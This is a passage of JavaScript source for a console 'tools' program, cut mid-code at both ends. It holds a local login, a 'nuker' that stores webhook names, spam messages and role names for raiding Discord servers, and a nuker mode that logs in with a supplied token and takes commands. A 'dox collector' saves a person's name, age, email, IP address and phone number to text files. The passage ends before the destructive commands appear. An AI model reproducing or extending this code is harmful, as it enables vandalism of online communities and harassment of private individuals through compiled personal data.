                                    console.log(
                                      red("                             > ") +
                                        white("Incorrect theme colour given")
                                    );
                                    console.log(` `);
                                    console.log(
                                      mainColor(
                                        "                             > "
                                      ) + white("red")
                                    );
                                    console.log(
                                      mainColor(
                                        "                             > "
                                      ) + white("green")
                                    );
                                    console.log(
                                      mainColor(
                                        "                             > "
                                      ) + white("yellow")
                                    );
                                    console.log(
                                      mainColor(
                                        "                             > "
                                      ) + white("cyan")
                                    );
                                    console.log(
                                      mainColor(
                                        "                             > "
                                      ) + white("grey")
                                    );
                                    console.log(
                                      mainColor(
                                        "                             > "
                                      ) + white("magenta (Default)")
                                    );
                                    console.log(" ");
                                    pickTheme();
                                    return;
                                  }

                                  const colorFile = require("./data/data.json");

                                  let colorConvert;
                                  if (color.toLowerCase() === "magenta") {
                                    colorConvert = 3;
                                  }

                                  if (color.toLowerCase() === "cyan") {
                                    colorConvert = 4;
                                  }

                                  if (color.toLowerCase() === "red") {
                                    colorConvert = 1;
                                  }

                                  if (color.toLowerCase() === "green") {
                                    colorConvert = 2;
                                  }

                                  if (color.toLowerCase() === "yellow") {
                                    colorConvert = 5;
                                  }
                                  if (color.toLowerCase() === "grey") {
                                    colorConvert = 6;
                                  }

                                  colorFile[5] = {
                                    color: colorConvert,
                                  };
                                  fs.writeFile(
                                    "./data/data.json",
                                    JSON.stringify(colorFile),
                                    (err) => {
                                      if (err) {
                                      }
                                    }
                                  );
                                  setTimeout(() => {
                                    start();
                                    console.clear();
                                  }, 2000);
                                }
                              );
                            }
                          }
                          if (choice === "1") {
                            if (loggedIn === true) {
                              if (
                                require("./data/data.json")[2].func === true
                              ) {
                                console.log(
                                  green("                             > ") +
                                    white("You are already logged in")
                                );
                                console.log(` `);
                                setTimeout(() => {
                                  rl.question(
                                    mainColor(
                                      "                             > "
                                    ) +
                                      white(
                                        "Would you like to disable auto login"
                                      ) +
                                      mainColor(": "),
                                    (opp) => {
                                      if (opp === "yes" || opp === "Yes") {
                                        const sssss = require("./data/data.json");

                                        sssss[2] = {
                                          func: false,
                                        };
                                        loggedIn = false;

                                        fs.writeFile(
                                          "./data/data.json",
                                          JSON.stringify(sssss),
                                          (err) => {
                                            if (err) console.log(err);
                                          }
                                        );
                                      } else {
                                      }
                                      setTimeout(() => {
                                        console.clear();
                                        start();
                                      }, 600);
                                    }
                                  );
                                }, 200);
                                return;
                              } else {
                                console.log(
                                  green("                             > ") +
                                    white("You are already logged in")
                                );
                                setTimeout(() => {
                                  console.clear();
                                  start();
                                }, 2 * 1000);
                                return;
                              }
                            }
                            let isRight = true;
                            process.title = `[${ccLx} tools] - Login`;
                            console.clear();
                            setTimeout(() => {
                              console.log(`      `);
                              console.log(`      `);
                              console.log(
                                white(
                                  "                                       ╦  ═╗ ╦╔╦╗╔═╗  ╔╦╗╔═╗╔═╗╦  "
                                )
                              );
                            }, 30);
                            setTimeout(() => {
                              console.log(
                                blackBright(
                                  "                                       ║  ╔╩╦╝ ║ ║╣    ║ ║ ║║ ║║   "
                                )
                              );
                            }, 60);
                            setTimeout(() => {
                              console.log(
                                mainColor(
                                  "                                       ╩═╝╩ ╚═ ╩ ╚═╝   ╩ ╚═╝╚═╝╩═╝"
                                )
                              );
                            }, 90);
                            setTimeout(() => {
                              console.log(`      `);
                              console.log(`      `);
                            }, 120);
                            setTimeout(() => {
                              rl.question(
                                mainColor(
                                  "                                       > "
                                ) +
                                  white("Enter username") +
                                  mainColor(": "),
                                (usernameUInTrime) => {
                                  let username = usernameUInTrime.trim();

                                  const f = require("./data/logins.json");

                                  let userNames = Object.keys(f);

                                  if (!userNames.includes(username)) {
                                    isRight = false;
                                  }

                                  const passwords = f[username];

                                  rl.question(
                                    mainColor(
                                      "                                       > "
                                    ) +
                                      white("Enter password") +
                                      mainColor(": "),
                                    (passwordUnTrim) => {
                                      console.log(" ");
                                      let password = passwordUnTrim.trim();

                                      var doKeepl = true;

                                      if (!passwords) {
                                        isRight = false;
                                      } else {
                                        if (passwords.password !== password) {
                                          isRight = false;
                                        }
                                      }
                                      if (isRight === false) {
                                        console.log(`  `);
                                        console.log(
                                          red(
                                            "                                       > "
                                          ) + white("Incorrect login")
                                        );
                                        if (!massLogins.has(1)) {
                                          massLogins.set(1, {
                                            heat: 20,
                                          });
                                        } else {
                                          let curHeat = massLogins.get(1).heat;
                                          massLogins.set(1, {
                                            heat: curHeat + 20,
                                          });
                                        }
                                        setTimeout(() => {
                                          console.clear();
                                          start();
                                        }, 1200);
                                        return;
                                      } else {
                                        if ((doKeepl = true)) {
                                          if (massLogins.has(1)) {
                                            if (massLogins.get(1).heat >= 100) {
                                              console.log(
                                                red(
                                                  "                                       > "
                                                ) +
                                                  white(
                                                    "Mass login detected "
                                                  ) +
                                                  mainColor(
                                                    massLogins.get(1).heat / 20
                                                  ) +
                                                  white(" logins found")
                                              );
                                              return;
                                            }
                                          }
                                          process.title = `[${ccLx} tools] - Welcome ${username}`;
                                          console.log(
                                            green(
                                              "                                       > "
                                            ) + white("Saving login..")
                                          );
                                          const sww = require("./data/data.json");

                                          sww[2] = {
                                            func: true,
                                          };
                                          fs.writeFile(
                                            "./data/data.json",
                                            JSON.stringify(sww),
                                            (err) => {
                                              if (err) console.log(err);
                                            }
                                          );
                                        }
                                        setTimeout(() => {
                                          console.log(` `);
                                          console.log(
                                            green(
                                              "                                       > "
                                            ) +
                                              white(`Welcome back ${username}`)
                                          );
                                          accountUsername = `${username}`;

                                          const f = require("./data/data.json");

                                          f[10] = username;

                                          fs.writeFile(
                                            "./data/data.json",
                                            JSON.stringify(f),
                                            (err) => {}
                                          );
                                        }, 500);
                                        setTimeout(() => {
                                          loggedIn = true;
                                          start();
                                        }, 1200);
                                      }
                                    }
                                  );
                                }
                              );
                            }, 150);
                          }
                          if (choice === "2") {
                            const nl = require("./data/nuker.json");
                            if (nl[1]) {
                              rl.question(
                                mainColor("                             > ") +
                                  white(
                                    "Nuke settings found, Would you like to view them or set new"
                                  ) +
                                  mainColor(": "),
                                (ope) => {
                                  const opes = ["view", "new"];
                                  if (!opes.includes(ope)) {
                                  }
                                  if (ope === "view") {
                                    try {
                                      console.log(` `);
                                      console.log(
                                        mainColor(
                                          "                             > "
                                        ) +
                                          white("Webhook names: ") +
                                          mainColor(nl[1].names.join(", "))
                                      );
                                      console.log(
                                        mainColor(
                                          "                             > "
                                        ) +
                                          white("Server name: ") +
                                          mainColor(nl[2].name)
                                      );
                                      console.log(
                                        mainColor(
                                          "                             > "
                                        ) +
                                          white("Channel names: ") +
                                          mainColor(nl[3].name.join(", "))
                                      );
                                      console.log(
                                        mainColor(
                                          "                             > "
                                        ) +
                                          white("Spam messages: ") +
                                          mainColor(nl[4].names.join(", "))
                                      );
                                      console.log(
                                        mainColor(
                                          "                             > "
                                        ) +
                                          white("Role names: ") +
                                          mainColor(nl[5].names.join(", "))
                                      );
                                      setTimeout(() => {
                                        rl.question(
                                          mainColor(
                                            "                             > "
                                          ) +
                                            white("Type anything to continue") +
                                            mainColor(": "),
                                          () => {
                                            console.clear();
                                            start();
                                          }
                                        );
                                      }, 2000);
                                    } catch (e) {
                                      console.log(" ");
                                      console.log(
                                        red("                             > ") +
                                          white("Failed to open nuke settings")
                                      );
                                      console.log(" ");
                                      setTimeout(() => {
                                        rl.question(
                                          mainColor(
                                            "                             > "
                                          ) +
                                            white("Type anything to continue") +
                                            mainColor(": "),
                                          () => {
                                            console.clear();
                                            mainSettings();
                                          },
                                          1 * 1000
                                        );
                                      });
                                    }
                                  } else {
                                    if (ope === "new") {
                                      const nuker = require("./data/nuker.json");
                                      console.log(" ");
                                      rl.question(
                                        green(
                                          "                             > "
                                        ) + mainColor("Enter webhook names: "),
                                        (wbeNames) => {
                                          let webHookNames = wbeNames.split(
                                            / +/g
                                          );

                                          nuker[1] = {
                                            names: webHookNames,
                                          };
                                          fs.writeFile(
                                            "./data/nuker.json",
                                            JSON.stringify(nuker),
                                            (err) => {
                                              if (err) console.log(err);
                                            }
                                          );

                                          rl.question(
                                            green(
                                              "                             > "
                                            ) +
                                              mainColor(
                                                "Enter server name to set: "
                                              ),
                                            (serverName) => {
                                              const ns = require("./data/nuker.json");

                                              ns[2] = {
                                                name: serverName,
                                              };

                                              fs.writeFile(
                                                "./data/nuker.json",
                                                JSON.stringify(ns),
                                                (err) => {
                                                  if (err) console.log(err);
                                                }
                                              );

                                              rl.question(
                                                green(
                                                  "                             > "
                                                ) +
                                                  mainColor(
                                                    "Enter channel names: "
                                                  ),
                                                (ceNames) => {
                                                  const nf = require("./data/nuker.json");

                                                  const chNames = ceNames.split(
                                                    / +/g
                                                  );

                                                  nf[3] = {
                                                    name: chNames,
                                                  };

                                                  fs.writeFile(
                                                    "./data/nuker.json",
                                                    JSON.stringify(nf),
                                                    (err) => {
                                                      if (err) console.log(err);
                                                    }
                                                  );

                                                  rl.question(
                                                    green(
                                                      "                             > "
                                                    ) +
                                                      mainColor(
                                                        "Enter messages to spam: "
                                                      ),
                                                    (wbeMessages) => {
                                                      const webHookMessages = wbeMessages.split(
                                                        / +/g
                                                      );

                                                      const nd = require("./data/nuker.json");

                                                      nd[4] = {
                                                        names: webHookMessages,
                                                      };

                                                      fs.writeFile(
                                                        "./data/nuker.json",
                                                        JSON.stringify(
                                                          nd,
                                                          null,
                                                          2
                                                        ),
                                                        (err) => {
                                                          if (err)
                                                            console.log(err);
                                                        }
                                                      );

                                                      rl.question(
                                                        green(
                                                          "                             >"
                                                        ) +
                                                          mainColor(
                                                            "Enter role names: "
                                                          ),
                                                        (rlNames) => {
                                                          const roleNames = rlNames.split(
                                                            / +/g
                                                          );

                                                          const hj = require("./data/nuker.json");

                                                          hj[5] = {
                                                            names: roleNames,
                                                          };

                                                          fs.writeFile(
                                                            "./data/nuker.json",
                                                            JSON.stringify(
                                                              hj,
                                                              null,
                                                              2
                                                            ),
                                                            (err) => {
                                                              if (err)
                                                                console.log(
                                                                  err
                                                                );
                                                            }
                                                          );
                                                          setTimeout(() => {
                                                            console.clear();
                                                            mainSettings();
                                                          }, 2 * 1000);
                                                        }
                                                      );
                                                    }
                                                  );
                                                }
                                              );
                                            }
                                          );
                                        }
                                      );
                                      return;
                                    }
                                  }
                                }
                              );
                            } else {
                              console.log(
                                red("                             > ") +
                                  white("No nuke data found")
                              );
                              console.log(" ");
                              setTimeout(() => {
                                const nuker = require("./data/nuker.json");
                                console.log(" ");
                                rl.question(
                                  green("                             > ") +
                                    mainColor("Enter webhook names: "),
                                  (wbeNames) => {
                                    let webHookNames = wbeNames.split(/ +/g);

                                    nuker[1] = {
                                      names: webHookNames,
                                    };
                                    fs.writeFile(
                                      "./data/nuker.json",
                                      JSON.stringify(nuker),
                                      (err) => {
                                        if (err) console.log(err);
                                      }
                                    );

                                    rl.question(
                                      green("                             > ") +
                                        mainColor("Enter server name to set: "),
                                      (serverName) => {
                                        const ns = require("./data/nuker.json");

                                        ns[2] = {
                                          name: serverName,
                                        };

                                        fs.writeFile(
                                          "./data/nuker.json",
                                          JSON.stringify(ns),
                                          (err) => {
                                            if (err) console.log(err);
                                          }
                                        );

                                        rl.question(
                                          green(
                                            "                             > "
                                          ) +
                                            mainColor("Enter channel names: "),
                                          (ceNames) => {
                                            const nf = require("./data/nuker.json");

                                            const chNames = ceNames.split(
                                              / +/g
                                            );

                                            nf[3] = {
                                              name: chNames,
                                            };

                                            fs.writeFile(
                                              "./data/nuker.json",
                                              JSON.stringify(nf),
                                              (err) => {
                                                if (err) console.log(err);
                                              }
                                            );

                                            rl.question(
                                              green(
                                                "                             > "
                                              ) +
                                                mainColor(
                                                  "Enter messages to spam: "
                                                ),
                                              (wbeMessages) => {
                                                const webHookMessages = wbeMessages.split(
                                                  / +/g
                                                );

                                                const nd = require("./data/nuker.json");

                                                nd[4] = {
                                                  names: webHookMessages,
                                                };

                                                fs.writeFile(
                                                  "./data/nuker.json",
                                                  JSON.stringify(nd, null, 2),
                                                  (err) => {
                                                    if (err) console.log(err);
                                                  }
                                                );

                                                rl.question(
                                                  green(
                                                    "                             >"
                                                  ) +
                                                    mainColor(
                                                      "Enter role names: "
                                                    ),
                                                  (rlNames) => {
                                                    const roleNames = rlNames.split(
                                                      / +/g
                                                    );

                                                    const hj = require("./data/nuker.json");

                                                    hj[5] = {
                                                      names: roleNames,
                                                    };

                                                    fs.writeFile(
                                                      "./data/nuker.json",
                                                      JSON.stringify(
                                                        hj,
                                                        null,
                                                        2
                                                      ),
                                                      (err) => {
                                                        if (err)
                                                          console.log(err);
                                                      }
                                                    );
                                                    setTimeout(() => {
                                                      console.clear();
                                                      mainSettings();
                                                    }, 2 * 1000);
                                                  }
                                                );
                                              }
                                            );
                                          }
                                        );
                                      }
                                    );
                                  }
                                );
                                return;
                              }, 1000);
                            }
                          }
                          if (choice === "4") {
                            //  rl.close();
                            console.clear();
                            setTimeout(() => {
                              console.log(
                                mainColor(
                                  "                                ╦  ═╗ ╦╔╦╗╔═╗"
                                )
                              );
                            }, 80);
                            setTimeout(() => {
                              console.log(
                                blackBright(
                                  "                                ║  ╔╩╦╝ ║ ║╣ "
                                )
                              );
                            }, 100);
                            setTimeout(() => {
                              console.log(
                                white(
                                  "                                ╩═╝╩ ╚═ ╩ ╚═╝"
                                )
                              );
                              console.log(" ");
                              console.log(` `);
                            }, 120);
                            setTimeout(() => {
                              console.log(
                                mainColor("                             > ") +
                                  white("Starting dox collector..")
                              );
                              setTimeout(() => {
                                console.log(` `);
                                rl.question(
                                  mainColor("                             > ") +
                                    white("Enter name") +
                                    mainColor(": "),
                                  (namee) => {
                                    rl.question(
                                      mainColor(
                                        "                             > "
                                      ) +
                                        white("Enter email") +
                                        mainColor(": "),
                                      (email) => {
                                        rl.question(
                                          mainColor(
                                            "                             > "
                                          ) +
                                            white("Enter Age") +
                                            mainColor(": "),
                                          (age) => {
                                            rl.question(
                                              mainColor(
                                                "                             > "
                                              ) +
                                                white("Enter IP") +
                                                mainColor(": "),
                                              (IP) => {
                                                rl.question(
                                                  mainColor(
                                                    "                             > "
                                                  ) +
                                                    white(
                                                      "Enter phone number"
                                                    ) +
                                                    mainColor(": "),
                                                  (phoneNumber) => {
                                                    rl.question(
                                                      mainColor(
                                                        "                             > "
                                                      ) +
                                                        white("Extra info") +
                                                        mainColor(": "),
                                                      (extraInfo) => {
                                                        /**
                                                        *  file[namee] = {
                                                          name: namee,
                                                          age: age,
                                                          number: phoneNumber,
                                                          email: email,
                                                          ip: IP,
                                                          extraInfo: extraInfo,
                                                        };
                                                        */
                                                        async function goWriteDoxes() {
                                                          /**
                                                                                     *    let contents = await fs.promises.readFile('./data/doxes.json');
                                                                                       let array = JSON.parse(contents);
                                                                                       if (require('./data/doxes.json').map(map => map.name === (namee))) {
                                                                                           contents = JSON.stringify(array, null, 2);
                                                                                           await fs.writeFile("./data/doxes.json", contents, (err) => {});
                                                                                       }
                                                                                       array.push({                     // first object
                                                                                         "name": namee,
                                                                                         "age": age,
                                                                                         "number": phoneNumber
                                                                                       , "email": email,
                                                                                           "ip": IP,
                                                                                          "extraInfo": extraInfo    
       
                                                                                       });
                                                                                       contents = JSON.stringify(array, null, 2);
                                                                                       await fs.promises.writeFile("./data/doxes.json", contents, (err) => {
                                                                                           
                                                                                       });
                                                                                     */
                                                          try {
                                                            setTimeout(() => {
                                                              console.log(` `);
                                                              console.log(
                                                                mainColor(
                                                                  "                             > "
                                                                ) +
                                                                  white(
                                                                    "Saved "
                                                                  ) +
                                                                  mainColor(
                                                                    namee
                                                                  ) +
                                                                  white(" dox")
                                                              );

                                                              setTimeout(() => {
                                                                start();
                                                              }, 1000);
                                                            }, 2000);
                                                            fs.writeFile(
                                                              `./doxes/${namee}-dox.txt`,
                                                              `Name: ${namee} \nAge: ${age} \nPhone number: ${phoneNumber} \nEmail: ${email} \nIP: ${IP} \n=========\nExtras\n=========\n${extraInfo} `,
                                                              (err) => {}
                                                            );
                                                          } catch {
                                                            console.log(
                                                              red(
                                                                "                             > "
                                                              ) +
                                                                white(
                                                                  "Failed to save dox"
                                                                )
                                                            );
                                                            setTimeout(() => {
                                                              ran();
                                                            }, 2000);
                                                          }
                                                        }
                                                        goWriteDoxes();
                                                        /**
                                                                                 *  setTimeout(() => {
                                                                                     start().then(() => {
                                                                                         setTimeout(() => {
                                                                                         console.log(` \n`)
                                                                                         console.log('                             [object Object]')
                                                                                         console.log(` `)
                                                                                         setTimeout(() => {
                                                                                             console.log(mainColor('                             Fatal error'))
                                                                                             console.log('\n')
                                                                                             setTimeout(() => {
                                                                                             console.log(green('                             Saving data...'))
                                                                                             console.log('\n')
                                                                                             setTimeout(() => {
                                                                                             console.log(red('                             Mass errors.. Shutting down'))
                                                                                             setTimeout(() => {
                                                                                                 process.exit();
                                                                                             }, 2000)
                                                                                         }, 800)
                                                                                         }, 800)
                                                                                         }, 100)
                                                                                     }, 1500)
                                                                                     })
                                                                                 }, 2000)
                                                                                 */
                                                      }
                                                    );
                                                  }
                                                );
                                              }
                                            );
                                          }
                                        );
                                      }
                                    );
                                  }
                                );
                              }, 1000);
                            }, 140);
                          }
                          if (choice === "5") {
                            /**
                                                 *    console.log(` `)
                                                   rl.question(mainColor('                             > ') + white('Enter name of dox to fetch')+mainColor(': '), (nameOfDox) => {
                                                       const info = require('./data/doxes.json').find(a => a.name === nameOfDox)
                                                       if (!info) {
                                                           console.log(` `)
                                                           console.log(red('                             > ') + white('No dox found'))
                                                           setTimeout(() => {
                                                               start();
                                                           }, 2000);
                                                           return;
                                                       };
                                                       console.log(` `)
                                                       console.log(` `)
                                                       console.log(green('                             > ') + white(`Name: ${info.name}`))
                                                       console.log(green('                             > ') + white(`Age: ${info.age}`))
                                                       console.log(green('                             > ') + white(`Phone number: ${info.number}`))
                                                       console.log(green('                             > ') + white(`email: ${info.email}`))
                                                       console.log(green('                             > ') + white(`IP: ${info.ip}`))
                                                       console.log(green('                             > ') + white(`Extra info: ${info.extraInfo}`))
                                                       console.log(` `)
                                                       console.log(` `)
                                                       console.log(` `)
                                                       rl.question(mainColor('                             > ') + white('Type anything to continue')+mainColor(': '), () => {
                                                           console.clear();
                                                           start();
                                                       })
                                                   })
                                                 */
                            setTimeout(() => {
                              start();
                            }, 500);
                          }
                        }
                      );
                    }, 280);
                  }
                } else {
                  if (od === "4") {
                    mainNukerGo();
                    function mainNukerGo() {
                      if (loggedIn === false) {
                        console.log(
                          red("                             > ") +
                            white("No account is logged in")
                        );
                        setTimeout(() => {
                          console.clear();
                          start();
                        }, 600);
                        return;
                      }
                      process.title = `[${ccLx} tools] - ${ccLx} nuker`;
                      setTimeout(() => {
                        console.clear();
                        console.log(`      `);
                        console.log(`      `);
                        console.log(
                          white(
                            "                           ╦  ═╗ ╦╔╦╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗"
                          )
                        );
                        console.log(
                          blackBright(
                            "                           ║  ╔╩╦╝ ║ ║╣   ║║║║ ║╠╩╗║╣ ╠╦╝"
                          )
                        );
                        console.log(
                          mainColor(
                            "                           ╩═╝╩ ╚═ ╩ ╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═"
                          )
                        );
                        console.log(`      `);
                        console.log(`      `);
                        const nuker = require("./data/nuker.json");

                        if (!nuker[1]) {
                          console.clear();
                          console.log(`      `);
                          console.log(`      `);
                          console.log(
                            white(
                              "                           ╦  ═╗ ╦╔╦╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗"
                            )
                          );
                          console.log(
                            blackBright(
                              "                           ║  ╔╩╦╝ ║ ║╣   ║║║║ ║╠╩╗║╣ ╠╦╝"
                            )
                          );
                          console.log(
                            mainColor(
                              "                           ╩═╝╩ ╚═ ╩ ╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═"
                            )
                          );
                          console.log(`      `);
                          console.log(`      `);
                          console.log(
                            white("        [+] ") +
                              red("No nuke data was found, Starting setup.. ")
                          );

                          setTimeout(() => {
                            console.clear();
                            console.log(`      `);
                            console.log(`      `);
                            console.log(
                              white(
                                "                           ╦  ═╗ ╦╔╦╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗"
                              )
                            );
                            console.log(
                              blackBright(
                                "                           ║  ╔╩╦╝ ║ ║╣   ║║║║ ║╠╩╗║╣ ╠╦╝"
                              )
                            );
                            console.log(
                              mainColor(
                                "                           ╩═╝╩ ╚═ ╩ ╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═"
                              )
                            );
                            console.log(`      `);
                            console.log(`      `);
                            console.log(`       `);
                            rl.question(
                              green("                > ") +
                                mainColor("Enter webhook names: "),
                              (wbeNames) => {
                                let webHookNames = wbeNames.split(/ +/g);

                                nuker[1] = {
                                  names: webHookNames,
                                };
                                fs.writeFile(
                                  "./data/nuker.json",
                                  JSON.stringify(nuker),
                                  (err) => {
                                    if (err) console.log(err);
                                  }
                                );

                                rl.question(
                                  green("                > ") +
                                    mainColor("Enter server name to set: "),
                                  (serverName) => {
                                    const ns = require("./data/nuker.json");

                                    ns[2] = {
                                      name: serverName,
                                    };

                                    fs.writeFile(
                                      "./data/nuker.json",
                                      JSON.stringify(ns),
                                      (err) => {
                                        if (err) console.log(err);
                                      }
                                    );

                                    rl.question(
                                      green("                > ") +
                                        mainColor("Enter channel names: "),
                                      (ceNames) => {
                                        const nf = require("./data/nuker.json");

                                        const chNames = ceNames.split(/ +/g);

                                        nf[3] = {
                                          name: chNames,
                                        };

                                        fs.writeFile(
                                          "./data/nuker.json",
                                          JSON.stringify(nf),
                                          (err) => {
                                            if (err) console.log(err);
                                          }
                                        );

                                        rl.question(
                                          green("                > ") +
                                            mainColor(
                                              "Enter messages to spam: "
                                            ),
                                          (wbeMessages) => {
                                            const webHookMessages = wbeMessages.split(
                                              / +/g
                                            );

                                            const nd = require("./data/nuker.json");

                                            nd[4] = {
                                              names: webHookMessages,
                                            };

                                            fs.writeFile(
                                              "./data/nuker.json",
                                              JSON.stringify(nd, null, 2),
                                              (err) => {
                                                if (err) console.log(err);
                                              }
                                            );

                                            rl.question(
                                              green("                >") +
                                                mainColor("Enter role names: "),
                                              (rlNames) => {
                                                const roleNames = rlNames.split(
                                                  / +/g
                                                );

                                                const hj = require("./data/nuker.json");

                                                hj[5] = {
                                                  names: roleNames,
                                                };

                                                fs.writeFile(
                                                  "./data/nuker.json",
                                                  JSON.stringify(hj, null, 2),
                                                  (err) => {
                                                    if (err) console.log(err);
                                                  }
                                                );
                                                setTimeout(() => {
                                                  console.clear();
                                                  start();
                                                }, 2 * 1000);
                                              }
                                            );
                                          }
                                        );
                                      }
                                    );
                                  }
                                );
                              }
                            );
                          });
                          return;
                        }
                        rl.question(
                          green("                     > ") +
                            white(
                              "Would you like to use previous data or set new Data?" +
                                mainColor(": ")
                            ),
                          (mainOp) => {
                            const mainOpes = ["new", "old"];

                            if (!mainOpes.includes(mainOp)) {
                              console.log(
                                red("                > ") +
                                  white("Incorrect opetion given")
                              );
                              setTimeout(() => {
                                start();
                              }, 2000);
                              return;
                            }

                            /**
                                                 *   if (!['new', 'old'].includes(mainOp)) {
                                                          console.log(white('          [+]') + red('Incorrect option given ') + white('[+]'))
                                                          setTimeout(() => {
                                                              console.clear()
                                                              main();
                                                          }, 3 * 1000)
                                                  }
                                                 */

                            if (mainOp.trim() === "new") {
                              setTimeout(() => {
                                console.clear();
                                console.log(`      `);
                                console.log(`      `);
                                console.log(
                                  white(
                                    "                           ╦  ═╗ ╦╔╦╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗"
                                  )
                                );
                                console.log(
                                  blackBright(
                                    "                           ║  ╔╩╦╝ ║ ║╣   ║║║║ ║╠╩╗║╣ ╠╦╝"
                                  )
                                );
                                console.log(
                                  mainColor(
                                    "                           ╩═╝╩ ╚═ ╩ ╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═"
                                  )
                                );
                                console.log(`      `);
                                console.log(`      `);
                                console.log(`       `);
                                rl.question(
                                  green("                > ") +
                                    mainColor("Enter webhook names: "),
                                  (wbeNames) => {
                                    let webHookNames = wbeNames.split(/ +/g);

                                    nuker[1] = {
                                      names: webHookNames,
                                    };
                                    fs.writeFile(
                                      "./data/nuker.json",
                                      JSON.stringify(nuker),
                                      (err) => {
                                        if (err) console.log(err);
                                      }
                                    );

                                    rl.question(
                                      green("                > ") +
                                        mainColor("Enter server name to set: "),
                                      (serverName) => {
                                        const ns = require("./data/nuker.json");

                                        ns[2] = {
                                          name: serverName,
                                        };

                                        fs.writeFile(
                                          "./data/nuker.json",
                                          JSON.stringify(ns),
                                          (err) => {
                                            if (err) console.log(err);
                                          }
                                        );

                                        rl.question(
                                          green("                > ") +
                                            mainColor("Enter channel names: "),
                                          (ceNames) => {
                                            const nf = require("./data/nuker.json");

                                            const chNames = ceNames.split(
                                              / +/g
                                            );

                                            nf[3] = {
                                              name: chNames,
                                            };

                                            fs.writeFile(
                                              "./data/nuker.json",
                                              JSON.stringify(nf),
                                              (err) => {
                                                if (err) console.log(err);
                                              }
                                            );

                                            rl.question(
                                              green("                > ") +
                                                mainColor(
                                                  "Enter messages to spam: "
                                                ),
                                              (wbeMessages) => {
                                                const webHookMessages = wbeMessages.split(
                                                  / +/g
                                                );

                                                const nd = require("./data/nuker.json");

                                                nd[4] = {
                                                  names: webHookMessages,
                                                };

                                                fs.writeFile(
                                                  "./data/nuker.json",
                                                  JSON.stringify(nd, null, 2),
                                                  (err) => {
                                                    if (err) console.log(err);
                                                  }
                                                );

                                                rl.question(
                                                  green("                > ") +
                                                    mainColor(
                                                      "Enter role names:"
                                                    ),
                                                  (rlNames) => {
                                                    const roleNames = rlNames.split(
                                                      / +/g
                                                    );

                                                    const nj = require("./data/nuker.json");

                                                    nj[5] = {
                                                      names: roleNames,
                                                    };

                                                    fs.writeFile(
                                                      "./data/nuker.json",
                                                      JSON.stringify(nj),
                                                      (err) => {
                                                        if (err)
                                                          console.log(err);
                                                      }
                                                    );

                                                    setTimeout(() => {
                                                      console.clear();
                                                      start();
                                                    }, 2 * 1000);
                                                  }
                                                );
                                              }
                                            );
                                          }
                                        );
                                      }
                                    );
                                  }
                                );
                              });
                              return;
                            }
                            if (mainOp.trim() === "old") {
                              console.clear();
                              console.log(`      `);
                              console.log(`      `);
                              console.log(
                                white(
                                  "                           ╦  ═╗ ╦╔╦╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗"
                                )
                              );
                              console.log(
                                blackBright(
                                  "                           ║  ╔╩╦╝ ║ ║╣   ║║║║ ║╠╩╗║╣ ╠╦╝"
                                )
                              );
                              console.log(
                                mainColor(
                                  "                           ╩═╝╩ ╚═ ╩ ╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═"
                                )
                              );
                              console.log(`      `);
                              console.log(`      `);
                              console.log(`       `);
                              rl.question(
                                green("                           > ") +
                                  white("Enter token" + mainColor(": ")),
                                (token) => {
                                  rl.question(
                                    green("                           > ") +
                                      white("Enter your ID" + mainColor(": ")),
                                    (id) => {
                                      const mainNuker = new Client();
                                      if (
                                        token.startsWith('"') &&
                                        token.endsWith('"')
                                      ) {
                                        token = token.slice(
                                          1,
                                          token.length - 1
                                        );
                                      }

                                      mainNuker.on("ready", () => {
                                        process.title = `[${ccLx} nuker] - Connected ${mainNuker.user.tag}`;
                                        console.clear();
                                        console.clear();
                                        console.log(`      `);
                                        console.log(`      `);
                                        console.log(
                                          white(
                                            "                           ╦  ═╗ ╦╔╦╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗"
                                          )
                                        );
                                        console.log(
                                          blackBright(
                                            "                           ║  ╔╩╦╝ ║ ║╣   ║║║║ ║╠╩╗║╣ ╠╦╝"
                                          )
                                        );
                                        console.log(
                                          mainColor(
                                            "                           ╩═╝╩ ╚═ ╩ ╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═"
                                          )
                                        );
                                        console.log(`      `);
                                        console.log(
                                          mainColor(
                                            "                            ════════════════════════════"
                                          )
                                        );
                                        console.log(
                                          white(
                                            `                               Connected `
                                          ) +
                                            mainColor("[") +
                                            white(mainNuker.user.tag) +
                                            mainColor("]")
                                        );
                                        console.log(
                                          white(
                                            `                               Guilds `
                                          ) +
                                            mainColor("[") +
                                            white(mainNuker.guilds.size) +
                                            mainColor("]")
                                        );
                                        console.log(
                                          white(
                                            `                               Prefix `
                                          ) +
                                            mainColor("[") +
                                            white("!") +
                                            mainColor("]")
                                        );
                                        console.log(
                                          mainColor(
                                            "                            ════════════════════════════"
                                          )
                                        );

                                        console.log(`      `);
                                        console.log(`       `);

                                        /**
                                                                 *     if (!mainNuker.user.bot) {
    
                                                                        console.log(` `)
                                                                        console.log(white('                         [+] ') + red('This nuker cannot be used as a self bot ') + white('[+]'))
                                                                        setTimeout(() => {
                                                                            rl.question(green('                 > ') + white('Type anything to continue: '), () => {
                                                                                console.clear();
                                                                                start();
                                                                            })
                                                                        }, 600)
                                                                        return;
                                                                    }
                                                                 */

                                        function mainNukerLogo() {
                                          mainNuker.on(
                                            "message",
                                            async (message) => {
                                              const nl = require("./data/nuker.json");
                                              const prefix = "!";
                                              if (message.author.id !== id)
                                                return;
                                              if (
                                                !message.content.startsWith(
                                                  prefix
                                                )
                                              )
                                                return;

                                              const args = message.content
                                                .slice(prefix.length)
                                                .trim()
                                                .split(/ +/g);
                                              const command = args
                                                .shift()
                                                .toLocaleLowerCase();

                                              if (command === "help") {
                                                const helpEmbed = new RichEmbed()
                                                  .setColor(0x2f3136)
                                                  .setAuthor(
                                                    `${ccLx} nuker`,
                                                    "https://cdn.discordapp.com/attachments/703580033238827009/810392250709442610/devil_1.jpeg"
                                                  )
                                                  .setDescription(
